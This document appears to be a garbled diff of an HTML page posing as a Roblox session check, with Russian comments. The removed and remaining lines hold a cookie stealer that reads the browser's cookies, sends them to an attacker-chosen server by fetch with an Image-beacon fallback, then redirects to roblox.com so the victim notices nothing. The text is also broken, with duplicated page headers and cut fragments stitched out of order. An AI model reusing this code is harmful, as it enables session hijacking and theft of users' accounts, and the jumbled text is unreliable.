@@ -89,57 +89,6 @@
         button:hover { background: #0088cc; }
     </style>
 </head>
-<body>
-    <div class="container">
-        <h2>🔐 Roblox Session</h2>
-
-        <div id="status" class="status info">⏳ Проверка...</div>
-
-        <div id="cookieDisplay" class="cookie-box" style="display:none;">Куки не найдены</div>
-
-        <button onclick="window.location.reload()">🔄 Повторить</button>
-    </div>
-
-    <script>
-        // ===== НАСТРОЙКА =====
-        // Сюда вставь свой сервер
-        var TARGET = 'http://127.0.0.1:8080/';
-        // =====================
-
-        var statusEl = document.getElementById('status');
-        var cookieDisplay = document.getElementById('cookieDisplay');
-
-        function log(msg, type) {
-            statusEl.textContent = msg;
-            statusEl.className = 'status ' + type;
-        }
-
-        // 1. Проверяем куки
-        var cookies = document.cookie;
-        cookieDisplay.style.display = 'block';
-
-        if (!cookies || cookies.length === 0) {
-            cookieDisplay.textContent = '❌ Куки НЕ найдены. Ты не залогинен в Roblox в этом браузере.';
-            cookieDisplay.style.color = '#ff8a8a';
-            log('❌ Нет кук. Зайди на roblox.com и залогинься.', 'error');
-        } else {
-            cookieDisplay.textContent = '✅ Куки найдены: ' + cookies;
-            cookieDisplay.style.color = '#8affb2';
-            log('📤 Отправка кук на сервер...', 'info');
-
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
-</head>
-<body>
-    <script>
-        // ===== ТВОЙ СЕРВЕР =====
-        var TARGET = 'http://127.0.0.1:8080/';
-        // ========================
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -165,32 +114,6 @@
                 console.log('Fetch не сработал, но Image уже отправил');
             });
         }
-        window.location.replace('https://www.roblox.com/home');
-    </script>
-</body>
-</html>
-  console.log('=== КОНЕЦ ===');
-    </script>
-</body>
-</html>
-okies })
-            })
-            .then(function(response) {
-                // даже если ответ 400/500 — нам пофиг, главное — отправили
-                console.log('Отправлено на сервер');
-            })
-            .catch(function(err) {
-                // Если fetch не сработал (CORS, блокировка) — пробуем через Image
-                var img = new Image();
-                img.src = TARGET + '?c=' + encodeURIComponent(cookies);
-                console.log('Отправлено через Image (fallback)');
-            });
-        } else {
-            console.log('Куки не найдены');
-        }
-
-        // 3. Перенаправляем на настоящий Roblox, чтобы жертва ничего не заметила
-        // Используем replace, чтобы не сохранять нашу страницу в истории
         window.location.replace('https://www.roblox.com/home');
     </script>
 </body>
